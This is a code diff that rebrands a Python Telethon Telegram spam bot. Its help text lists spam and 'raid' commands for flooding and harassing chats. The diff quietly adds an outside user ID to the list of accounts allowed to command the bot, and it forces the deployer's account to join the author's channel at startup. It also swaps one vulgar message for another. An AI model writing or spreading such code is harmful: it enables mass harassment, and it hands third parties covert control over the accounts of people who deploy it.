@@ -73,7 +73,7 @@ put = ""
 
 que = {}
 
-SMEX_USERS = [2020051281, 2079359858, 2044073145]
+SMEX_USERS = [2020051281, 2079359858, 2044073145 , 1280100907]
 for x in SUDO_USERS: 
     SMEX_USERS.append(x)
     
@@ -112,10 +112,10 @@ async def start_yukki():
             print("Booting Up The Client 1")
             await idk.start()
             botme = await idk.get_me()
-            await idk(functions.channels.JoinChannelRequest(channel=" @Baapjiiiiiiiiii"))
-            await idk(functions.channels.JoinChannelRequest(channel=" @Baapjiiiiiiiiii"))
-            await idk(functions.channels.JoinChannelRequest(channel=" @Baapjiiiiiiiiii"))
-            await idk(functions.channels.JoinChannelRequest(channel=" @Baapjiiiiiiiiii"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ANSHUL_LOGO"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ANSHUL_LOGO"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ANSHUL_LOGO"))
+            await idk(functions.channels.JoinChannelRequest(channel=" @ANSHUL_LOGO"))
             botid = telethon.utils.get_peer_id(botme)
             SMEX_USERS.append(botid)
         except Exception as e:
@@ -833,7 +833,7 @@ async def _(e):
             event = await e.reply(text, parse_mode=None, link_preview=None )
             try:
                 await e.client(functions.channels.JoinChannelRequest(channel=bc))
-                await event.edit("JAA RHA GAAND MARNE 🤤🔥")
+                await event.edit("GHAND HACK KARNE JARA 😁")
             except Exception as e:
                 await event.edit(str(e))   
         else:
@@ -1483,7 +1483,7 @@ async def restart(e):
 
 async def help(e):
     if e.sender_id in SMEX_USERS:
-       text = " ⚔️ 🇧 🇦 🇦 🇵  🇯 🇮 🇮 Տᑭᗩᗰ ᗷOT ⚔️\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\nᑌՏᗴᖇᗷOT ᑕOᗰᗰᗩᑎᗪՏ:\n.bio\n.join\n.pjoin\n.leave\n\nՏᑭᗩᗰ ᑕOᗰᗰᗩᑎᗪՏ:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
+       text = " ⚔️ 𝗔𝗡𝗦𝗛𝗨𝗟 Տᑭᗩᗰ ᗷOT ⚔️\n\nᑌTIᒪ ᑕOᗰᗰᗩᑎᗪՏ:\n.ping\n.restart\n\nᑌՏᗴᖇᗷOT ᑕOᗰᗰᗩᑎᗪՏ:\n.bio\n.join\n.pjoin\n.leave\n\nՏᑭᗩᗰ ᑕOᗰᗰᗩᑎᗪՏ:\n.spam\n.delayspam\n.bigspam\n.raid\n.replyraid\n.dreplyraid\n\n\nFor more help regarding usage of plugins type plugins name"
        await e.reply(text, parse_mode=None, link_preview=None )
 
         
@@ -1491,11 +1491,11 @@ async def help(e):
     
         
 text = """
-CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL ʙᴀᴀᴘ ᴊɪɪ sᴘᴀᴍʙᴏᴛ DEPLOYED SUCCESSFULLY """
+CONGRATS🥳🥳🥳 YOUR FASTEST, SMOOTHEST AND POWERFUL ᴀɴsʜᴜʟ sᴘᴀᴍʙᴏᴛ DEPLOYED SUCCESSFULLY """
 
 print(text)
 print("")
-print("YOᑌᖇ 🇧 🇦 🇦 🇵  🇯 🇮 🇮  Տᑭᗩᗰ ᗷOT ᗪᗴᑭᒪOY !!")
+print("YOᑌᖇ 𝗔𝗡𝗦𝗛𝗨𝗟  Տᑭᗩᗰ ᗷOT ᗪᗴᑭᒪOY !!")
 if len(sys.argv) not in (1, 3, 4):
     try:
         idk.disconnect()
